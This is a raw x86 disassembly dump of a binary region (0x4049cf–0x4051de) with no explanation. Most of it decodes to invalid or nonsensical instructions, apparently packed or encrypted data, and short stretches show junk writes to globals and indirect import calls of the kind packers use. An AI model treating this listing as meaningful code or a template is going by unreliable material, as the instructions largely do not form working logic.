  4049cf:	neg    DWORD PTR [ecx]
  4049d1:	dec    ebp
  4049d2:	xor    edi,edx
  4049d4:	cmp    DWORD PTR [eax+0x3],esp
  4049d7:	arpl   di,si
  4049d9:	lea    esp,[eax]
  4049db:	fidivr WORD PTR gs:[eax-0x6]
  4049df:	int3   
  4049e0:	out    0x3b,al
  4049e2:	js     0x40497d
  4049e4:	xchg   ebp,eax
  4049e5:	ja     0x4049cc
  4049e7:	rol    bl,0xde
  4049ea:	cmp    al,0x24
  4049ec:	fstp   QWORD PTR ds:0xf2de91eb
  4049f2:	cmp    DWORD PTR [ecx+0x2d],0x69
  4049f6:	imul   ecx,DWORD PTR [esi],0x9b04e685
  4049fc:	jp     0x4049e6
  4049fe:	(bad)  
  404a00:	das    
  404a01:	jno    0x4049ba
  404a03:	mov    al,0xd
  404a05:	int    0x85
  404a07:	aad    0x71
  404a09:	popa   
  404a0a:	add    edx,DWORD PTR [eax+0x51]
  404a0d:	retf   
  404a0e:	fmul   QWORD PTR [ebp-0x38199816]
  404a14:	xor    eax,0xf0060e82
  404a19:	les    esi,FWORD PTR [esi+0x7d]
  404a1c:	std    
  404a1d:	sub    eax,0x454c4a7f
  404a22:	ret    
  404a23:	adc    DWORD PTR [eax],esi
  404a25:	inc    eax
  404a26:	(bad)  [ebx+0x3c]
  404a29:	push   ss
  404a2a:	pop    ebx
  404a2b:	fiadd  WORD PTR [edx+0x37]
  404a2e:	pop    ebx
  404a2f:	into   
  404a30:	pop    edi
  404a31:	loope  0x404a62
  404a33:	jae    0x404a0b
  404a35:	pop    ss
  404a36:	leave  
  404a37:	push   esp
  404a38:	shr    BYTE PTR [edi+ebp*1],1
  404a3b:	mov    bl,dh
  404a3d:	push   edi
  404a3e:	mov    cl,0x9f
  404a40:	cmc    
  404a41:	sub    al,0xe0
  404a43:	adc    ebp,ecx
  404a45:	jne    0x404a5d
  404a47:	sbb    eax,0x6f490879
  404a4c:	xor    al,0xfc
  404a4e:	movzx  edi,WORD PTR [edi-0x3b]
  404a52:	ret    
  404a53:	adc    ch,BYTE PTR [ecx+0x491962fd]
  404a59:	and    esi,DWORD PTR [edx+0x10]
  404a5c:	stc    
  404a5d:	jnp    0x404a6c
  404a5f:	and    DWORD PTR [eax-0xbc3e6e3],ebx
  404a65:	hlt    
  404a66:	(bad)  
  404a67:	int    0xcb
  404a69:	xor    ebx,DWORD PTR [edx-0x56]
  404a6c:	jns    0x404a9d
  404a6e:	xlat   BYTE PTR ds:[ebx]
  404a6f:	das    
  404a70:	clc    
  404a71:	jns    0x404a2d
  404a73:	lods   eax,DWORD PTR ds:[esi]
  404a74:	pushf  
  404a75:	scas   eax,DWORD PTR es:[edi]
  404a76:	inc    ebp
  404a77:	outs   dx,DWORD PTR ds:[esi]
  404a78:	jmp    0x9ccf:0x28bf08
  404a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a81:	scas   eax,DWORD PTR es:[edi]
  404a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a83:	stc    
  404a84:	sahf   
  404a85:	cmp    eax,0x503ef7e8
  404a8a:	lahf   
  404a8b:	adc    BYTE PTR [edi+0x1e],cl
  404a8e:	arpl   sp,di
  404a90:	push   0xf
  404a92:	lods   al,BYTE PTR ds:[esi]
  404a93:	rol    DWORD PTR [edx],0x1
  404a96:	cmp    eax,0x4229a2
  404a9b:	shr    eax,0x2
  404a9e:	mov    eax,DWORD PTR [ebx]
  404aa0:	mov    edx,DWORD PTR ds:0x4229a2
  404aa6:	xor    DWORD PTR ds:0x4228b2,edx
  404aac:	mov    edx,DWORD PTR [ebx+0x4]
  404aaf:	and    DWORD PTR ds:0x42293e,0x42295a
  404ab9:	xor    ecx,edi
  404abb:	shl    eax,0x1e
  404abe:	adc    DWORD PTR ds:0x4229a6,0x6b1a
  404ac8:	xor    eax,eax
  404aca:	or     DWORD PTR ds:0x422942,edi
  404ad0:	jmp    0x40505a
  404ad5:	xchg   DWORD PTR [edx+esi*8-0x3a],ebx
  404ad9:	fcomp  DWORD PTR [eax]
  404adb:	xor    bl,BYTE PTR [ecx+ebx*8]
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	jp     0x404a8f
  404ae1:	push   ebp
  404ae2:	xchg   ebp,eax
  404ae3:	sahf   
  404ae4:	mov    dl,0xac
  404ae6:	mov    bh,0x16
  404ae8:	push   ss
  404ae9:	cmp    eax,0x40161604
  404aee:	inc    ecx
  404aef:	jecxz  0x404ace
  404af1:	in     eax,0xe9
  404af3:	inc    esp
  404af4:	push   ecx
  404af5:	ret    0xbf22
  404af8:	cld    
  404af9:	xchg   esi,eax
  404afa:	mov    eax,ds:0x482d1000
  404aff:	ret    
  404b00:	pop    edi
  404b01:	adc    eax,edx
  404b03:	retf   0xd463
  404b06:	sub    BYTE PTR [edi-0x62],al
  404b09:	push   ebx
  404b0a:	xor    DWORD PTR [esi+edi*2+0x4c],ecx
  404b0e:	xor    BYTE PTR [ecx],bl
  404b10:	fisub  WORD PTR es:[edi+0x5bff61a8]
  404b17:	dec    ecx
  404b18:	(bad)  
  404b19:	test   BYTE PTR [edx-0x3575969],0x83
  404b20:	jae    0x404b31
  404b22:	push   ds
  404b23:	and    esp,DWORD PTR [edi+0x11]
  404b26:	pusha  
  404b27:	cmp    edx,ecx
  404b29:	xchg   edi,eax
  404b2a:	outs   dx,BYTE PTR ds:[esi]
  404b2b:	inc    esp
  404b2c:	out    dx,eax
  404b2d:	mov    ah,0x2a
  404b2f:	push   0xffffffd4
  404b31:	test   eax,0x734a2b2b
  404b36:	push   edi
  404b37:	inc    edx
  404b38:	sbb    eax,0xe15dcf01
  404b3d:	mov    dl,0xbf
  404b3f:	sub    BYTE PTR [ebx+ebp*1-0x2d],bl
  404b43:	jl     0x404b6a
  404b45:	lock push 0xdfcbd81
  404b4b:	add    dl,BYTE PTR [ebp-0x75]
  404b4e:	and    eax,0x3e750eb
  404b53:	stc    
  404b54:	outs   dx,BYTE PTR ds:[si]
  404b56:	mov    al,gs:0x1185d0b9
  404b5c:	and    DWORD PTR [eax+0x14],ecx
  404b5f:	cli    
  404b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b61:	push   ebp
  404b62:	pop    edi
  404b63:	pop    edx
  404b64:	iret   
  404b65:	sub    BYTE PTR [edx],bl
  404b67:	push   edi
  404b68:	inc    ebx
  404b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6a:	in     eax,0xba
  404b6c:	push   ebx
  404b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b6e:	adc    al,0xee
  404b70:	cld    
  404b71:	mov    bl,0x4f
  404b73:	and    BYTE PTR [esi],cl
  404b75:	ror    dl,0x64
  404b78:	xchg   DWORD PTR [edi+0x84b6e84],ebx
  404b7e:	cmp    eax,0x95dcbbf8
  404b83:	les    ecx,FWORD PTR [edi+ebx*8-0x7c2b69bf]
  404b8a:	sub    DWORD PTR [edx+0x34],ecx
  404b8d:	inc    ebp
  404b8e:	int    0xd6
  404b90:	addr16 sbb al,0x13
  404b93:	test   al,0x7d
  404b95:	sub    BYTE PTR [edi],bl
  404b97:	sahf   
  404b98:	inc    edx
  404b99:	ins    DWORD PTR es:[edi],dx
  404b9a:	inc    edi
  404b9b:	stos   BYTE PTR es:[edi],al
  404b9c:	ror    DWORD PTR [edx+0x2666dc60],cl
  404ba2:	enter  0xe572,0x5f
  404ba6:	jns    0x404b3c
  404ba8:	fs retf 
  404baa:	test   BYTE PTR [ecx+0x7accce5],dh
  404bb0:	xlat   BYTE PTR ds:[ebx]
  404bb1:	repnz sub eax,0x56c7384f
  404bb7:	loopne 0x404b86
  404bb9:	loope  0x404b6c
  404bbb:	xor    ebx,DWORD PTR [edi+0x70]
  404bbe:	xchg   ebx,eax
  404bbf:	mov    al,0x2d
  404bc1:	mov    ah,0x39
  404bc3:	loope  0x404bea
  404bc5:	lods   eax,DWORD PTR ds:[esi]
  404bc6:	gs lahf 
  404bc8:	fbstp  TBYTE PTR [edi-0x2e]
  404bcb:	mov    ds:0x9c1202e8,al
  404bd0:	push   eax
  404bd1:	xlat   BYTE PTR ds:[ebx]
  404bd2:	iret   
  404bd3:	sahf   
  404bd4:	loope  0x404bb4
  404bd6:	mov    cl,0x16
  404bd8:	cld    
  404bd9:	stc    
  404bda:	and    DWORD PTR [ecx],ebx
  404bdc:	(bad)  
  404bdd:	sub    BYTE PTR [eax+esi*4+0x473535b4],ah
  404be4:	ret    
  404be5:	jmp    FWORD PTR [edx+0xc73483b]
  404beb:	dec    edi
  404bec:	sbb    eax,0xaf1e207e
  404bf1:	arpl   si,si
  404bf3:	pushf  
  404bf4:	mov    ds:0x31073d26,al
  404bf9:	dec    ebp
  404bfa:	cmp    esp,ebp
  404bfc:	add    DWORD PTR [eax+0x1a],ebx
  404bff:	sahf   
  404c00:	out    0xa2,eax
  404c02:	out    dx,eax
  404c03:	cmp    eax,DWORD PTR [ecx-0x15]
  404c06:	and    al,0xa8
  404c08:	xchg   DWORD PTR [edx-0x4d],edi
  404c0b:	cmc    
  404c0c:	sub    bh,bl
  404c0e:	mov    gs,WORD PTR [eax]
  404c10:	jmp    0x404c3e
  404c12:	mov    esp,0x637ada41
  404c17:	pop    ds
  404c18:	jmp    0x2042:0x76ca810e
  404c1f:	pop    es
  404c20:	mov    esi,0x4bb493dd
  404c25:	(bad)  
  404c27:	stos   BYTE PTR es:[edi],al
  404c28:	push   ebp
  404c29:	mul    BYTE PTR [ecx+0x8df842f]
  404c2f:	shr    BYTE PTR [ecx+0x32c84917],1
  404c35:	mov    esp,0x79fb2e61
  404c3a:	push   0x2a
  404c3c:	les    edx,FWORD PTR gs:[ebp+0x13460df0]
  404c43:	in     eax,dx
  404c44:	pushf  
  404c45:	stos   DWORD PTR es:[edi],eax
  404c46:	cmp    edx,DWORD PTR [edi]
  404c48:	dec    ebx
  404c49:	lods   eax,DWORD PTR ds:[esi]
  404c4a:	push   ss
  404c4b:	pop    edi
  404c4c:	gs push 0xd3f70544
  404c52:	lods   al,BYTE PTR ds:[esi]
  404c53:	inc    esi
  404c54:	xor    dh,dl
  404c56:	xor    al,0xe
  404c58:	test   bh,dl
  404c5a:	addr16 push esi
  404c5c:	lock imul ecx,DWORD PTR [edi],0x61fba703
  404c63:	in     eax,0xee
  404c65:	xor    BYTE PTR [eax+0x23],dh
  404c68:	mov    dh,0x36
  404c6a:	adc    ch,BYTE PTR [eax]
  404c6c:	add    BYTE PTR [esi],ch
  404c6e:	push   cs
  404c6f:	xchg   edx,eax
  404c70:	dec    esp
  404c71:	outs   dx,DWORD PTR ds:[esi]
  404c72:	or     cl,BYTE PTR [esi]
  404c74:	xchg   ebp,eax
  404c75:	jp     0x404cdc
  404c77:	add    al,0x73
  404c79:	pop    ss
  404c7a:	or     eax,esp
  404c7c:	jno    0x404c7a
  404c7e:	jp     0x404c50
  404c80:	sbb    ch,al
  404c82:	and    al,0xb1
  404c84:	jmp    0xab37:0xb8706eb6
  404c8b:	mov    eax,ds:0xbde70ccb
  404c90:	xor    al,0x14
  404c92:	ja     0x404c7a
  404c94:	cwde   
  404c95:	cmp    ebx,DWORD PTR [eax]
  404c97:	inc    esi
  404c98:	aas    
  404c99:	inc    edx
  404c9a:	bnd ret 0x7660
  404c9e:	dec    esp
  404c9f:	das    
  404ca0:	das    
  404ca1:	lods   al,BYTE PTR ds:[esi]
  404ca2:	dec    ebp
  404ca3:	or     dh,0xa6
  404ca6:	add    eax,0xa96e9cfa
  404cab:	add    edx,edx
  404cad:	lea    esp,[ebx+0x32]
  404cb0:	stc    
  404cb1:	and    BYTE PTR [si-0x6bc0],bh
  404cb6:	sahf   
  404cb7:	fadd   QWORD PTR [esi-0x4122066c]
  404cbd:	push   ss
  404cbe:	sbb    al,0x84
  404cc0:	pop    eax
  404cc1:	pushf  
  404cc2:	inc    ecx
  404cc3:	icebp  
  404cc4:	and    BYTE PTR [ebp+0x2c29c646],bl
  404cca:	scas   eax,DWORD PTR es:[edi]
  404ccb:	ss sub al,0x13
  404cce:	jmp    0x411cbd6
  404cd3:	mov    ds:0x543dc8a4,al
  404cd8:	arpl   WORD PTR [ebp+0x5b920191],cx
  404cde:	ror    DWORD PTR [edi-0x6b],0x49
  404ce2:	arpl   WORD PTR cs:[edi],si
  404ce5:	push   esi
  404ce6:	mov    ecx,0x96f800ff
  404ceb:	lahf   
  404cec:	mov    eax,0xe512fcb5
  404cf1:	pop    esp
  404cf2:	mov    gs,WORD PTR fs:[ebp+0x6e4fb540]
  404cf9:	or     ch,ah
  404cfb:	popa   
  404cfc:	pop    ecx
  404cfd:	pop    es
  404cfe:	and    BYTE PTR [edi],0x42
  404d01:	and    BYTE PTR [ebp-0x22],dh
  404d04:	leave  
  404d05:	mov    edx,0x2818faed
  404d0a:	push   edi
  404d0b:	fisub  WORD PTR [ebx-0x48]
  404d0e:	cmp    BYTE PTR [ebx-0x65],cl
  404d11:	pop    esi
  404d12:	out    0xd0,eax
  404d14:	sbb    al,0xa9
  404d16:	mov    bh,0xc1
  404d18:	push   ebx
  404d19:	xchg   BYTE PTR [edx-0x36d6b3c2],ch
  404d1f:	adc    DWORD PTR [edi-0x19],edi
  404d22:	cld    
  404d23:	and    eax,0xd9d96fb6
  404d28:	add    eax,0xd9d20c68
  404d2d:	cdq    
  404d2e:	mov    edx,0x1041e3ce
  404d33:	add    ah,BYTE PTR [ecx-0x76fd58ba]
  404d39:	jne    0x404d00
  404d3b:	xchg   esp,eax
  404d3c:	jbe    0x404ccb
  404d3e:	bound  eax,QWORD PTR [ebx+0x45]
  404d41:	or     BYTE PTR [esi+0x168bb864],dl
  404d47:	mov    cl,0xf8
  404d49:	icebp  
  404d4a:	imul   esp,DWORD PTR [ebx+0x77eaf42],0xaecfb69a
  404d54:	gs cmp eax,0x28f09c92
  404d5a:	pop    esi
  404d5b:	out    0x2e,eax
  404d5d:	mov    cl,BYTE PTR gs:[esi-0x7303745b]
  404d64:	cli    
  404d65:	inc    ecx
  404d66:	aam    0xcf
  404d68:	mov    ah,0x2d
  404d6a:	ret    0x73c2
  404d6d:	icebp  
  404d6e:	std    
  404d6f:	popa   
  404d70:	mul    DWORD PTR [ebx]
  404d72:	pop    esi
  404d73:	pop    edi
  404d74:	add    BYTE PTR ds:0x99c58ff5,al
  404d7a:	(bad)  
  404d7b:	int    0x53
  404d7d:	xor    edi,DWORD PTR ds:0xe6a3fe5d
  404d83:	int    0x84
  404d85:	rol    BYTE PTR [bp+0x3e],cl
  404d89:	fistp  QWORD PTR [edi+eax*1]
  404d8c:	bndstx [eax],bnd2
  404d8f:	out    0xfc,eax
  404d91:	test   al,0xee
  404d93:	inc    eax
  404d94:	jbe    0x404db5
  404d96:	xor    bh,BYTE PTR [esi-0x4a344b09]
  404d9c:	jecxz  0x404d66
  404d9e:	push   di
  404da0:	call   0x19d5:0x446572e8
  404da7:	(bad)  
  404da8:	fidivr WORD PTR [ebp-0x4ddc1f1f]
  404dae:	jmp    0x9037:0x5a956165
  404db5:	sbb    cl,BYTE PTR [eax]
  404db7:	aaa    
  404db8:	call   0xd872:0xa0c8e92d
  404dbf:	xlat   BYTE PTR ds:[ebx]
  404dc0:	nop
  404dc1:	outs   dx,DWORD PTR ds:[esi]
  404dc2:	dec    ecx
  404dc3:	sbb    DWORD PTR [ebx-0x25b28ba3],0xef10770f
  404dcd:	clc    
  404dce:	out    dx,al
  404dcf:	dec    edi
  404dd0:	dec    ebp
  404dd1:	call   0xe430bfda
  404dd6:	out    dx,eax
  404dd7:	cmp    ecx,ebp
  404dd9:	inc    eax
  404dda:	xchg   ebx,eax
  404ddb:	dec    esp
  404ddc:	ret    0x5f79
  404ddf:	adc    al,0x24
  404de1:	add    DWORD PTR [esi-0x21],0x55c84d35
  404de8:	dec    ecx
  404de9:	out    0xf6,eax
  404deb:	mov    edx,0x54c945e4
  404df0:	cmp    DWORD PTR [edx-0x642bbe9c],esp
  404df6:	push   ebp
  404df7:	dec    ebx
  404df8:	cwde   
  404df9:	cld    
  404dfa:	imul   ebx,DWORD PTR [esi-0x41adf7f3],0xf67163fd
  404e04:	leave  
  404e05:	sar    DWORD PTR [ebp-0x54],cl
  404e08:	push   ecx
  404e09:	fld    st(1)
  404e0b:	in     al,dx
  404e0c:	mov    gs,esi
  404e0e:	dec    ebp
  404e0f:	addr16 mov eax,0x4a941389
  404e15:	push   0x22
  404e17:	(bad)  
  404e18:	jl     0x404e26
  404e1a:	cmovs  ebp,DWORD PTR [edi-0x50]
  404e1e:	or     eax,0x88c7977
  404e23:	jp     0x404e87
  404e25:	push   0xe8d10314
  404e2a:	test   DWORD PTR [ecx+edi*8],0x89681465
  404e31:	xchg   ebp,eax
  404e32:	das    
  404e33:	inc    ebp
  404e34:	arpl   WORD PTR [edi+0x60b32f49],dx
  404e3a:	xchg   edi,eax
  404e3b:	and    al,0xc1
  404e3d:	xor    esp,esp
  404e3f:	popf   
  404e40:	popa   
  404e41:	nop
  404e42:	lahf   
  404e43:	mov    dl,0x9
  404e45:	sub    ch,BYTE PTR [ebx+0x46]
  404e48:	inc    ebp
  404e49:	xchg   esi,eax
  404e4a:	push   es
  404e4b:	hlt    
  404e4c:	enter  0x262,0xe6
  404e50:	mov    edi,es
  404e52:	or     DWORD PTR ds:0x50bec1d8,edi
  404e58:	xor    DWORD PTR [edi],0xffffffc0
  404e5b:	ror    al,1
  404e5d:	lahf   
  404e5e:	les    edx,FWORD PTR [ebx]
  404e60:	xchg   edi,eax
  404e61:	sahf   
  404e62:	push   esi
  404e63:	push   ss
  404e64:	ds ds (bad) 
  404e67:	scas   eax,DWORD PTR es:[edi]
  404e68:	repnz clc 
  404e6a:	push   es
  404e6b:	xchg   ebx,eax
  404e6c:	sti    
  404e6d:	and    DWORD PTR [ebx+0x67],0xd
  404e71:	jp     0x404ee1
  404e73:	int    0x2f
  404e75:	mov    bh,0xb0
  404e77:	cmc    
  404e78:	xchg   esp,eax
  404e79:	or     eax,0x6b172940
  404e7e:	fst    DWORD PTR [ebp-0x14e854a0]
  404e84:	fwait
  404e85:	test   BYTE PTR [ecx],cl
  404e87:	mov    ch,0xdf
  404e89:	push   eax
  404e8a:	mov    ebx,0xa2282172
  404e8f:	dec    esp
  404e90:	fwait
  404e91:	popf   
  404e92:	xchg   ebx,eax
  404e93:	xlat   BYTE PTR ds:[ebx]
  404e94:	add    cl,BYTE PTR [eax+0x3a]
  404e97:	or     eax,0x5329b829
  404e9c:	jbe    0x404edd
  404e9e:	ret    
  404e9f:	enter  0x4337,0x81
  404ea3:	popa   
  404ea4:	(bad)  
  404ea5:	cmp    bh,BYTE PTR [edi]
  404ea7:	add    ah,BYTE PTR [ebx-0x4d]
  404eaa:	xchg   edi,eax
  404eab:	add    dh,BYTE PTR [eax-0x6d0f82a4]
  404eb1:	test   BYTE PTR [esi+eax*4+0x37dc77d5],ch
  404eb8:	leave  
  404eb9:	add    edi,eax
  404ebb:	(bad)  
  404ebc:	daa    
  404ebd:	xor    DWORD PTR [edi-0x1c84a896],esi
  404ec3:	jne    0x404f25
  404ec5:	idiv   eax
  404ec7:	adc    edx,0x7982cbc7
  404ecd:	add    dl,BYTE PTR [edx]
  404ecf:	ret    0x59f7
  404ed2:	enter  0xa63,0x27
  404ed6:	fld    DWORD PTR [edi]
  404ed8:	sub    edx,DWORD PTR [esi+0x74]
  404edb:	out    dx,al
  404edc:	inc    edx
  404edd:	mov    ds:0xdf2f7b3c,al
  404ee2:	and    al,0x7b
  404ee5:	cwde   
  404ee6:	rcl    edi,1
  404ee8:	ficomp DWORD PTR [edi-0x5d]
  404eeb:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404eed:	nop
  404eee:	jmp    0x404f0b
  404ef0:	mov    ebx,0x9f437537
  404ef5:	jmp    0x4521:0x81d3cd0c
  404efc:	push   edx
  404efd:	int    0xe0
  404eff:	pop    ebp
  404f00:	add    ebp,edi
  404f02:	push   ecx
  404f03:	inc    ebp
  404f04:	inc    edi
  404f05:	mov    ds:0xb9a4129a,eax
  404f0a:	push   0xffffffe5
  404f0c:	cli    
  404f0d:	sbb    DWORD PTR [eax+0x6012701],0x44
  404f14:	xor    ebx,ecx
  404f16:	cld    
  404f17:	mov    ?,WORD PTR [ecx]
  404f19:	adc    DWORD PTR [esi-0x1e],eax
  404f1c:	outs   dx,DWORD PTR ds:[esi]
  404f1d:	push   cs
  404f1e:	out    0x96,eax
  404f20:	stos   DWORD PTR es:[edi],eax
  404f21:	sbb    bl,cl
  404f23:	xor    ah,BYTE PTR [esi+0x682843ea]
  404f29:	pop    ebx
  404f2a:	lds    eax,FWORD PTR [edi+ecx*4]
  404f2d:	mov    al,0xa0
  404f2f:	es pop ebx
  404f31:	mov    al,0xc9
  404f33:	jp     0x404f32
  404f35:	sub    BYTE PTR [ebx+0x179a7412],ah
  404f3b:	sbb    DWORD PTR [esp+esi*4],edx
  404f3e:	sub    al,0xc1
  404f40:	adc    ah,BYTE PTR [ecx+eax*1+0x55]
  404f44:	das    
  404f45:	je     0x404f38
  404f47:	maxps  xmm7,XMMWORD PTR [eax+0x1a]
  404f4b:	inc    ebx
  404f4c:	out    0x8d,eax
  404f4e:	mov    esp,DWORD PTR ds:0x7e21ed0e
  404f54:	clc    
  404f55:	mov    WORD PTR [esi+0xb],ss
  404f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f59:	out    0x58,eax
  404f5b:	pop    edx
  404f5c:	mov    dh,0xdb
  404f5e:	das    
  404f5f:	push   eax
  404f60:	pop    eax
  404f61:	cmp    esp,ecx
  404f63:	or     esi,DWORD PTR [ebx]
  404f65:	out    dx,al
  404f66:	outs   dx,DWORD PTR ds:[esi]
  404f67:	ins    BYTE PTR es:[edi],dx
  404f68:	sub    ebx,esp
  404f6a:	pusha  
  404f6b:	xchg   ebp,eax
  404f6c:	sahf   
  404f6d:	fmul   QWORD PTR [eax]
  404f6f:	in     eax,0x55
  404f71:	push   ebp
  404f72:	iret   
  404f73:	inc    esi
  404f74:	ss aam 0xbe
  404f77:	arpl   bx,ax
  404f79:	stos   DWORD PTR es:[edi],eax
  404f7a:	cmp    edi,eax
  404f7c:	sahf   
  404f7d:	jecxz  0x404f33
  404f7f:	and    DWORD PTR [edx+0xb],0xceb5eb7
  404f86:	fistp  WORD PTR [edi+0x4d3c2e35]
  404f8c:	cld    
  404f8d:	retf   
  404f8e:	sub    DWORD PTR [ebp+0x35f82056],ebp
  404f94:	adc    ebp,edi
  404f96:	test   DWORD PTR [edi],edx
  404f98:	inc    ebp
  404f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f9a:	push   eax
  404f9b:	ja     0x404f3e
  404f9d:	push   ss
  404f9e:	sub    eax,0x99477a64
  404fa3:	push   ecx
  404fa4:	add    esp,0x93d0a9af
  404faa:	pusha  
  404fab:	jle    0x40500c
  404fad:	mov    BYTE PTR [esi-0x25],dh
  404fb0:	mov    DWORD PTR [edi+0x21],ecx
  404fb3:	scas   eax,DWORD PTR es:[edi]
  404fb4:	mov    ebx,0xbf6db5f1
  404fb9:	dec    eax
  404fba:	xlat   BYTE PTR ds:[ebx]
  404fbb:	jge    0x404f6f
  404fbd:	sub    dh,BYTE PTR fs:[edi-0x16]
  404fc1:	sar    DWORD PTR [ecx-0x4a06a946],0x61
  404fc8:	xor    al,0xac
  404fca:	iret   
  404fcb:	and    eax,0x1d7173a1
  404fd0:	(bad)  
  404fd1:	xor    eax,0x5c9c3d46
  404fd6:	paddusb mm5,QWORD PTR [edx+0x70]
  404fda:	retf   
  404fdb:	lahf   
  404fdc:	push   eax
  404fdd:	imul   ebx,DWORD PTR [ebx],0x17
  404fe0:	adc    dl,ch
  404fe2:	or     DWORD PTR [edx],ecx
  404fe4:	push   0xfffffff9
  404fe6:	int3   
  404fe7:	mov    ds:0x99b2a958,al
  404fec:	(bad)  
  404fed:	gs into 
  404fef:	add    dl,BYTE PTR [ecx-0x3dac7ed]
  404ff5:	push   ecx
  404ff6:	xlat   BYTE PTR ds:[ebx]
  404ff7:	ja     0x404fa6
  404ff9:	jnp    0x404ffd
  404ffb:	mov    al,BYTE PTR [esi+0x22]
  404ffe:	push   es
  404fff:	fisttp QWORD PTR [ebp+0x1f3e5cba]
  405005:	cmp    al,0xa3
  405007:	imul   BYTE PTR [ebp+0xb]
  40500a:	ror    BYTE PTR [esi],0x93
  40500d:	test   al,cl
  40500f:	lods   eax,DWORD PTR ds:[esi]
  405010:	loope  0x405055
  405012:	xchg   ebx,eax
  405013:	fdiv   QWORD PTR [esi+0x52]
  405016:	jnp    0x405076
  405018:	loope  0x404fec
  40501a:	inc    esp
  40501b:	nop
  40501c:	lahf   
  40501d:	das    
  40501e:	fabs   
  405020:	or     al,0x76
  405022:	inc    eax
  405023:	loop   0x404fa6
  405025:	xchg   ebx,eax
  405026:	xchg   esi,eax
  405027:	aas    
  405028:	jns    0x405036
  40502a:	jg     0x404fd7
  40502c:	(bad)  
  40502d:	fwait
  40502e:	loope  0x40505c
  405030:	pushf  
  405031:	jecxz  0x404fc2
  405033:	push   0xffffff8e
  405035:	pop    ecx
  405036:	enter  0x8bdc,0x4f
  40503a:	in     al,0x82
  40503c:	adc    al,cl
  40503e:	(bad)  
  40503f:	dec    ebx
  405040:	mov    edi,0xf45673f6
  405045:	jmp    0x778c0d73
  40504a:	je     0x4050ab
  40504c:	mov    edi,0x58c2a4e4
  405051:	inc    edi
  405052:	pop    edi
  405053:	sub    bl,dl
  405055:	mov    ecx,ebp
  405057:	ret    
  405058:	and    al,0x42
  40505a:	or     eax,ecx
  40505c:	sub    DWORD PTR ds:0x42294a,0x3e8c
  405066:	mov    ecx,DWORD PTR [ebx]
  405068:	cmp    DWORD PTR ds:0x42291a,0x0
  40506f:	mov    edx,0x329b
  405074:	mov    DWORD PTR ds:0x42298e,edi
  40507a:	mov    DWORD PTR ds:0x422992,0x6944
  405084:	jmp    0x4050d1
  405089:	mov    DWORD PTR ds:0x4228a2,0x4c5b
  405093:	mov    DWORD PTR ds:0x42294a,0x78c7
  40509d:	jae    0x4050b9
  4050a3:	call   DWORD PTR ds:0x42a048
  4050a9:	and    DWORD PTR ds:0x422976,edi
  4050af:	sub    DWORD PTR ds:0x42292a,0xcc1
  4050b9:	add    edx,DWORD PTR ds:0x4228fe
  4050bf:	mov    edx,DWORD PTR ds:0x4229ae
  4050c5:	xor    DWORD PTR ds:0x42288a,edx
  4050cb:	xor    DWORD PTR ds:0x4228a6,ebx
  4050d1:	mov    edx,DWORD PTR [ebx+0x4]
  4050d4:	shrd   ecx,edx,0x2
  4050d8:	shr    edx,0x2
  4050db:	dec    edx
  4050dc:	mov    DWORD PTR [ebp-0x1c],ecx
  4050df:	mov    ecx,DWORD PTR [ebx]
  4050e1:	cmp    DWORD PTR ds:0x422956,0x0
  4050e8:	mov    DWORD PTR ds:0x4229a6,ecx
  4050ee:	mov    DWORD PTR ds:0x4228be,0x46b1
  4050f8:	mov    edx,0x1a3a
  4050fd:	jmp    0x405154
  405102:	mov    edx,DWORD PTR ds:0x4229be
  405108:	je     0x405144
  40510e:	push   0x4228ce
  405113:	push   0x891e
  405118:	call   DWORD PTR ds:0x42a298
  40511e:	mov    edx,DWORD PTR ds:0x422976
  405124:	sbb    DWORD PTR ds:0x4229a6,edx
  40512a:	or     DWORD PTR ds:0x4229b6,0x4229c6
  405134:	or     edx,DWORD PTR ds:0x4229ba
  40513a:	adc    DWORD PTR ds:0x42295a,0x7410
  405144:	xor    DWORD PTR ds:0x422932,0x293b
  40514e:	or     DWORD PTR ds:0x422982,edx
  405154:	mov    edx,DWORD PTR [ebx+0x4]
  405157:	or     DWORD PTR ds:0x422992,0x45bc
  405161:	xor    DWORD PTR [ebp-0x1c],edi
  405164:	sbb    DWORD PTR ds:0x4229ca,0x422976
  40516e:	xor    edx,edx
  405170:	not    DWORD PTR ds:0x4228d2
  405176:	or     edx,DWORD PTR [ebp-0x1c]
  405179:	or     DWORD PTR ds:0x42291e,0x4228e6
  405183:	jmp    0x40570d
  405188:	mov    cl,0xe1
  40518a:	inc    eax
  40518b:	test   al,0x40
  40518d:	sub    BYTE PTR [ecx],bl
  40518f:	fcomp  st(5)
  405191:	dec    edx
  405192:	int3   
  405193:	outs   dx,BYTE PTR ds:[esi]
  405194:	lock cmp al,BYTE PTR [eax-0x4c]
  405198:	(bad)  [ebx+0x43d1616]
  40519e:	push   ss
  40519f:	push   ss
  4051a0:	jo     0x405145
  4051a2:	jge    0x405192
  4051a4:	push   eax
  4051a5:	push   eax
  4051a6:	dec    ecx
  4051a7:	outs   dx,BYTE PTR ds:[esi]
  4051a8:	push   0xfffffffb
  4051aa:	dec    ebp
  4051ab:	pop    esp
  4051ac:	dec    ebp
  4051ad:	ror    DWORD PTR [edx-0x4e],1
  4051b0:	das    
  4051b1:	cmp    BYTE PTR [edi],bh
  4051b3:	outs   dx,DWORD PTR ds:[esi]
  4051b4:	fld    TBYTE PTR [edi+0x3351b469]
  4051ba:	xor    DWORD PTR [bp+di-0x17],ebx
  4051be:	xchg   BYTE PTR [ebx],dl
  4051c0:	rcl    dh,0x9
  4051c3:	(bad)  
  4051c4:	not    DWORD PTR [edx]
  4051c6:	and    ch,dl
  4051c8:	sub    BYTE PTR [edi+0x36],bh
  4051cb:	cmp    DWORD PTR [eax-0x20bb28cf],ebx
  4051d1:	out    dx,al
  4051d2:	mov    ds:0xdf11de2b,eax
  4051d7:	mov    ds:0xf815a679,al
  4051dc:	xchg   edi,eax
  4051dd:	hlt    
  4051de:	push   edx
